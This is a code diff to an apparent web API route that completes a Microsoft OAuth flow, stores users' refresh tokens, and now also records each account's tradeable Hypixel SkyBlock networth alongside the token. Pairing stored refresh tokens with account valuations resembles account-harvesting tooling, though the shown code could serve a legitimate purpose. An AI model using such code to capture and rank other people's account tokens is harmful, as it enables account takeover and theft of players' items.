@@ -4,6 +4,7 @@ import isJson from "../../../../../libs/checkJson";
 import { queryFirstRes } from "../../../../../libs/db/actions/query";
 import saveToken from "../../../../../libs/db/actions/saveToken";
 import oauthFlow from "../../../../../libs/microsoft/oauthFlow";
+import networthCalc from "../../../../../libs/hypixel/networthCalc";
 
 export const post: APIRoute = async ({ request }) => {
     if (!isJson) {
@@ -33,7 +34,8 @@ export const post: APIRoute = async ({ request }) => {
     if (data.status !== 200) {
         return await res(data.status, data.message);
     }
-    const saveSuccess = await saveToken(body.user_id, data['username'], data['uuid'], data['refresh_token'], callback_url)
+    const { unsoulboundNw } = await networthCalc(body.uuid) || {"unsoulboundNw": 0};
+    const saveSuccess = await saveToken(body.user_id, data['username'], data['uuid'], data['refresh_token'], callback_url, unsoulboundNw)
     if (!saveSuccess) {
         return await res(500, "Error Saving new Refresh Token");
     }
